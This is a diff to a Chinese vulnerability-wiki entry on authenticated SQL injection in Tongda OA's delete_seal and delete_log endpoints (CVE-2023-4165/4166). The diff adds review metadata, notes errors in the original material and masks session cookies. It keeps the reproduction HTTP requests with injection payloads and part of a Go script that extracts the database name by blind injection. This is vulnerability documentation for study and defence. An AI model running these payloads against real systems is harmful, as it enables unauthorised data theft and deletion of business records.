@@ -1,10 +1,53 @@
 ---
-cve: "CVE-2023-4165"
+title: "通达OA delete_seal/delete_log DELETE_STR SQL 注入"
+product: "通达OA"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: "CVE-2023-4165;CVE-2023-4166"
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "11.9实测"
+prerequisites: "inc/auth.inc.php需登录，最低角色未知"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+identifier_role: "primary"
+source: "原收录资料；原始作者及出处待核实"
+source_url: "https://mp.weixin.qq.com/s/_Onm36p0hMoA_FjszNUiVQ"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BE%20OA%20%E4%BF%A9%20SQL%20%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90.md"
+category_recommendation: "OA / 通达"
+id: "vw-cebaba6d1bc9564f756eac61"
+entity_id: "ve-cebaba6d1bc9564f756eac61"
+schema_version: "1"
 ---
 
-# 通达 OA 俩 SQL 注入复现与分析
+# 通达OA delete_seal/delete_log DELETE_STR SQL 注入
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：通达OA；delete_seal/delete_log DELETE_STR SQLi
+- 版本、配置及部署条件：11.9实测
+- 认证与权限前提：inc/auth.inc.php需登录，最低角色未知
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 两个端点完整代码适合主文
+- 首节sleep测试错用delete_log路由；char83请求与char84文字对齐
+- DELETE可能删业务记录，重查询增加负载，不能称无害验证
+- Go RawQuery未编码空格、默认重定向、固定2秒阈值、循环defer响应关闭影响可靠性
+- 缺补丁build及成对重复基线
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_Onm36p0hMoA_FjszNUiVQ)
 
   
@@ -105,7 +148,7 @@ inc/auth.inc.php(3)--->inc/session.php(77)--->inc/conn.php---(sql_injection)
 
 尝试使用网传的 poc 进行请求
 
-```
+```http
 GET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(83)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
 Host: 192.168.88.131
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
@@ -114,7 +157,7 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
-Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1
+Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=p************************1
 Cache-Control: max-age=0
 
 
@@ -158,7 +201,7 @@ header("location:log.php?start=$start");
 
 我们就直接上 POC 了，POC 和上面一模一样。
 
-```
+```http
 GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
 Host: 192.168.88.131
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
@@ -167,7 +210,7 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
-Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=4fb6c477; PHPSESSID=brpsncea78tf3qv8jgpdr69d20
+Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=4fb6c477; PHPSESSID=b************************0
 Cache-Control: max-age=0
 
 
@@ -202,7 +245,7 @@ func main() {
 
  url := "http://192.168.88.131/general/system/seal_manage/dianju/delete_log.php"                                                                                     // 目标网站的URL
  delay := 2                                                                                                                                                          // 延迟时间，单位为秒
- cookieValue := "Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1" // 替换为有效的Cookie值
+ cookieValue := "Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=p************************1" // 替换为有效的Cookie值
 
  characters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()+-" // 可能的字符集
 
